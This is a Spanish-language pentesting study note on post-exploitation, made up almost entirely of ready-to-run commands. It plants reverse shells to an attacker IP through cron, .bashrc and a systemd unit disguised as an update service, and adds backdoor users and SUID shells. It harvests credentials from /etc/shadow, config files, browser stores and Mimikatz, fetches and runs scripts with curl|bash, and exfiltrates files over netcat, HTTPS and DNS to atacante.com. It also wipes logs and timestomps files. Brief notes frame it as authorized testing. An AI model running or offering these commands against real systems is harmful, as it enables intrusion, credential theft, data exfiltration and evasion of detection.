---
title: "Post-Explotacion"
tags:
  - hacking
  - ofensivo
  - post-explotacion
  - hacking-ofensivo
tipo: hacking-ofensivo
certificacion: hacking-vault
---

# Post-Explotacion

La post-explotacion abarca todas las actividades realizadas despues de obtener acceso inicial a un sistema. Incluye persistencia, movimiento lateral, recopilacion de credenciales, exfiltracion de datos y tecnicas de pivoting para ampliar el alcance del ataque dentro de la red.

> **Nota de seguridad:** Las tecnicas de post-explotacion deben estar explicitamente incluidas en el alcance del contrato de pentesting. Documentar cada accion con marcas de tiempo es imprescindible para el informe y para deslindar responsabilidades.

## Tecnicas de Persistencia

La persistencia garantiza que el acceso al sistema se mantenga incluso tras reinicios o cambios de credenciales.

### Persistencia en Linux

```bash
# 1. Cron job malicioso
# Agregar una reverse shell que se ejecute cada minuto
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'") | crontab -

# Verificar cron jobs del usuario
crontab -l

# Cron job en directorio del sistema (requiere root)
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" >> /etc/crontab

# 2. Modificar .bashrc / .bash_profile
echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" &' >> ~/.bashrc

# 3. Agregar clave SSH autorizada
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3...clave_publica_del_atacante..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# 4. Crear servicio systemd (requiere root)
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service

# 5. Agregar usuario con privilegios (requiere root)
useradd -m -s /bin/bash -G sudo backdooruser
echo "backdooruser:password123" | chpasswd

# 6. Modificar un binario SUID existente (muy sigiloso)
cp /bin/bash /tmp/.hidden_bash
chmod u+s /tmp/.hidden_bash
# Ejecutar: /tmp/.hidden_bash -p
```

### Persistencia en Windows (conceptos)

```powershell
# Registro de inicio (Run keys)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\ruta\payload.exe"

# Tarea programada
schtasks /create /tn "SystemCheck" /tr "C:\ruta\payload.exe" /sc onlogon /ru SYSTEM

# Servicio de Windows
sc create backdoor binpath= "C:\ruta\payload.exe" start= auto
sc start backdoor
```

## Movimiento Lateral

El movimiento lateral permite expandir el acceso desde un sistema comprometido hacia otros en la misma red.

### SSH Pivoting

```bash
# Port forwarding local: acceder a servicio remoto a traves de pivot
# Redirige el puerto local 8080 al puerto 80 de 172.16.0.5 via el pivot
ssh -L 8080:172.16.0.5:80 usuario@10.10.10.1
# Ahora acceder a http://127.0.0.1:8080 llega a 172.16.0.5:80

# Port forwarding remoto: exponer servicio local al pivot
ssh -R 9090:127.0.0.1:80 usuario@10.10.10.1
# El puerto 9090 del servidor remoto redirige al puerto 80 local

# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 usuario@10.10.10.1
# Configura un proxy SOCKS en el puerto local 9050
# Usar con proxychains para enrutar todo el trafico

# SSH tunneling con salto multiple
ssh -J usuario@pivot1,usuario@pivot2 usuario@objetivo_final
```

### Proxychains

```bash
# Configurar proxychains (/etc/proxychains4.conf)
# Agregar al final del archivo:
# socks4 127.0.0.1 9050

# Usar herramientas a traves del proxy
proxychains nmap -sT -Pn 172.16.0.0/24
proxychains curl http://172.16.0.5
proxychains ssh usuario@172.16.0.5
proxychains crackmapexec smb 172.16.0.0/24

# Nota: proxychains solo funciona con TCP, no UDP
# Usar -sT en nmap (no -sS, requiere TCP connect)
```

### Chisel

```bash
# En la maquina del atacante (servidor)
./chisel server --reverse --port 8000

# En el pivot (cliente) - reverse SOCKS proxy
./chisel client 10.10.14.5:8000 R:socks

# En el pivot - port forwarding especifico
./chisel client 10.10.14.5:8000 R:8080:172.16.0.5:80

# Ahora usar proxychains con el SOCKS proxy en puerto 1080
# O acceder a localhost:8080 para llegar a 172.16.0.5:80
```

### Socat

```bash
# Port forwarding simple
socat TCP-LISTEN:8080,fork TCP:172.16.0.5:80

# Relay de shell reversa
# En el pivot:
socat TCP-LISTEN:4444,fork TCP:10.10.14.5:4444
# La victima se conecta al pivot:4444, que redirige al atacante:4444

# Socat como shell listener
socat TCP-LISTEN:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Sshuttle

```bash
# Crear VPN a traves de SSH (no requiere root en el pivot)
sshuttle -r usuario@10.10.10.1 172.16.0.0/24

# Con clave SSH
sshuttle -r usuario@10.10.10.1 --ssh-cmd "ssh -i id_rsa" 172.16.0.0/24

# Excluir el propio pivot
sshuttle -r usuario@10.10.10.1 172.16.0.0/24 -x 10.10.10.1

# Enrutar todo el trafico
sshuttle -r usuario@10.10.10.1 0.0.0.0/0
```

### Ligolo-ng

```bash
# En el atacante: iniciar el proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# En el pivot: conectar el agente
./agent -connect 10.10.14.5:11601 -ignore-cert

# En la interfaz del proxy:
>> session                       # Listar sesiones
>> session 1                     # Seleccionar sesion
>> ifconfig                      # Ver interfaces del pivot
>> start                         # Iniciar el tunel

# Agregar ruta en el atacante
sudo ip route add 172.16.0.0/24 dev ligolo

# Ahora se puede acceder directamente a la red 172.16.0.0/24
nmap -sT 172.16.0.5
curl http://172.16.0.5
```

## Recopilacion de Credenciales

### Linux

```bash
# Archivos de passwords y hashes
cat /etc/passwd                    # Usuarios del sistema
cat /etc/shadow                    # Hashes de passwords (requiere root)
cat /etc/group                     # Grupos del sistema

# Buscar passwords en archivos de configuracion
grep -ri "password" /etc/ 2>/dev/null
grep -ri "passwd" /etc/ 2>/dev/null
grep -ri "credential" /home/ 2>/dev/null

# Historial de comandos (puede contener passwords)
cat ~/.bash_history
cat ~/.zsh_history
cat /home/*/.bash_history 2>/dev/null

# Archivos de configuracion comunes con credenciales
cat /var/www/html/wp-config.php          # WordPress
cat /var/www/html/.env                    # Aplicaciones web
cat /etc/mysql/debian.cnf                 # MySQL
cat /home/*/.my.cnf 2>/dev/null          # MySQL usuario

# Claves SSH
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null

# Archivos de conexion
cat ~/.pgpass                             # PostgreSQL
cat ~/.netrc                              # FTP/HTTP
cat /home/*/.git-credentials 2>/dev/null  # Git

# Buscar passwords en memoria (si se tiene acceso)
strings /proc/*/environ 2>/dev/null | grep -i pass

# Bases de datos de navegadores
find / -name "Login Data" 2>/dev/null     # Chrome
find / -name "logins.json" 2>/dev/null    # Firefox
```

### Mimikatz (conceptos - entornos Windows)

```powershell
# Mimikatz es la herramienta principal para credenciales en Windows
# Requiere privilegios SYSTEM o de administrador

# Volcar credenciales en texto plano
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Volcar hashes SAM
mimikatz# lsadump::sam

# Volcar tickets Kerberos
mimikatz# sekurlsa::tickets /export

# Pass-the-Hash
mimikatz# sekurlsa::pth /user:admin /domain:dominio /ntlm:HASH /run:cmd.exe

# DCSync (replicar hashes del Domain Controller)
mimikatz# lsadump::dcsync /user:dominio\krbtgt
```

## Escalada de Privilegios - Herramientas Linux

### LinPEAS

```bash
# Transferir linpeas al objetivo
# En el atacante:
python3 -m http.server 80
# En el objetivo:
wget http://10.10.14.5/linpeas.sh
# o
curl http://10.10.14.5/linpeas.sh -o linpeas.sh

# Ejecutar
chmod +x linpeas.sh
./linpeas.sh

# Ejecucion sin escribir en disco
curl http://10.10.14.5/linpeas.sh | bash

# Guardar salida para analisis posterior
./linpeas.sh | tee linpeas_output.txt

# Secciones clave a revisar en la salida:
# - [+] Interesting Writable Files
# - [+] SUID/SGID binaries
# - [+] Sudo permissions
# - [+] Cron jobs
# - [+] Capabilities
# - [+] Passwords in config files
```

### LinEnum

```bash
# Ejecutar con informe completo
./LinEnum.sh -t

# Busqueda exhaustiva (mas lento pero mas completo)
./LinEnum.sh -t -e /tmp/linenum_export

# Verificaciones manuales rapidas
# Kernel exploits
uname -a
cat /proc/version

# Procesos corriendo como root
ps aux | grep root

# Servicios internos
ss -tlnp
netstat -tlnp
```

### pspy

```bash
# Monitorear procesos sin privilegios de root
# Util para detectar cron jobs y procesos ocultos
./pspy64

# Version de 32 bits
./pspy32

# Con filtro de colores
./pspy64 -c

# pspy muestra procesos que se ejecutan incluyendo
# los cron jobs de otros usuarios que no podemos ver
# con crontab -l
```

## Cubrir Huellas

> **Nota de seguridad:** En un pentesting real, NO se deben cubrir huellas. Estas tecnicas se estudian para entender como lo hacen los atacantes reales y poder detectar estas actividades. En un engagement profesional, se documentan todas las acciones realizadas.

```bash
# Limpiar historial de bash
history -c
history -w
echo "" > ~/.bash_history
unset HISTFILE                    # Deshabilitar historial para la sesion

# Manipular logs (requiere root)
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log

# Borrar entradas especificas de logs
sed -i '/10.10.14.5/d' /var/log/auth.log

# Timestomping - modificar fechas de archivos
touch -t 202301011200.00 archivo_modificado.txt
touch -r archivo_referencia.txt archivo_modificado.txt

# Eliminar archivos de forma segura
shred -zu archivo_sensible.txt

# Limpiar logs de ultimo acceso
echo "" > /var/log/wtmp              # Historial de logins
echo "" > /var/log/btmp              # Intentos fallidos
echo "" > /var/log/lastlog           # Ultimo login por usuario
```

## Metodos de Transferencia de Archivos

### Python HTTP Server

```bash
# En la maquina del atacante (servidor)
python3 -m http.server 80
python3 -m http.server 8080 --directory /ruta/archivos

# En la victima (cliente)
wget http://10.10.14.5/archivo
curl http://10.10.14.5/archivo -o archivo
```

### Wget y Curl

```bash
# Descargar archivo
wget http://10.10.14.5/linpeas.sh
wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh

# Con curl
curl http://10.10.14.5/linpeas.sh -o linpeas.sh
curl http://10.10.14.5/linpeas.sh | bash    # Ejecutar directamente

# Subir archivo con curl (si hay servidor escuchando)
curl -X POST http://10.10.14.5/upload -F "file=@/etc/passwd"
```

### Netcat

```bash
# Transferencia con netcat
# Receptor (atacante):
nc -lvnp 4444 > archivo_recibido

# Emisor (victima):
nc 10.10.14.5 4444 < /etc/shadow

# Transferir en sentido inverso
# En el atacante:
nc -lvnp 4444 < archivo_a_enviar
# En la victima:
nc 10.10.14.5 4444 > archivo_descargado
```

### Base64 Encoding

```bash
# Util cuando no hay herramientas de transferencia disponibles

# Codificar archivo en base64 (victima)
base64 -w 0 /etc/shadow
# Copiar la cadena base64

# Decodificar en la maquina atacante
echo "CADENA_BASE64_AQUI" | base64 -d > shadow

# Para archivos binarios
base64 -w 0 archivo_binario > encoded.txt
cat encoded.txt | base64 -d > archivo_original
```

### SCP y otros metodos

```bash
# SCP - si hay acceso SSH
scp archivo usuario@10.10.10.1:/ruta/destino
scp usuario@10.10.10.1:/ruta/archivo ./local

# PHP (si hay un servidor web con PHP)
# Crear upload.php en el servidor web:
# <?php move_uploaded_file($_FILES["f"]["tmp_name"],"./".$_FILES["f"]["name"]); ?>
curl -F "f=@archivo_local" http://10.10.10.1/upload.php

# SMB (compartir archivos via SMB)
# En el atacante:
impacket-smbserver share /ruta/archivos -smb2support
# En la victima (Windows):
copy \\10.10.14.5\share\archivo.exe C:\temp\
# En la victima (Linux):
smbclient //10.10.14.5/share -N -c "get archivo"
```

## Exfiltracion de Datos

```bash
# Comprimir datos antes de exfiltrar
tar czf /tmp/datos.tar.gz /ruta/datos_sensibles/
zip -r /tmp/datos.zip /ruta/datos_sensibles/

# Exfiltracion via DNS (evasion de firewalls)
# Codificar datos en consultas DNS
cat /etc/shadow | xxd -p | fold -w 60 | while read line; do
  nslookup $line.exfil.atacante.com
done

# Exfiltracion via HTTPS (se mezcla con trafico normal)
curl -X POST https://atacante.com/collect -d @datos.txt

# Exfiltracion via ICMP
# xxd -p datos.txt | while read line; do ping -c 1 -p $line atacante.com; done
```

## Resumen de Pivoting

| Herramienta | Tipo | Ventaja principal | Requiere en pivot |
|-------------|------|-------------------|--------------------|
| SSH -L/-R/-D | Tunel SSH | Nativo, sin herramientas extra | Servidor SSH |
| Proxychains | SOCKS proxy | Compatible con muchas herramientas | Proxy SOCKS activo |
| Chisel | Tunel TCP/SOCKS | Binario unico, facil de transferir | Binario chisel |
| Socat | Port forwarding | Muy flexible | Binario socat |
| Sshuttle | VPN sobre SSH | Transparente, no requiere root en pivot | Servidor SSH + Python |
| Ligolo-ng | Tunel completo | Acceso directo a la red, muy rapido | Binario agente |

> **Nota de seguridad:** Tras completar una prueba de penetracion, es obligatorio eliminar todas las backdoors, cuentas y archivos instalados en los sistemas comprometidos. El informe final debe incluir una lista detallada de todos los cambios realizados para que el equipo de defensa pueda verificar que el entorno ha sido restaurado a su estado original.
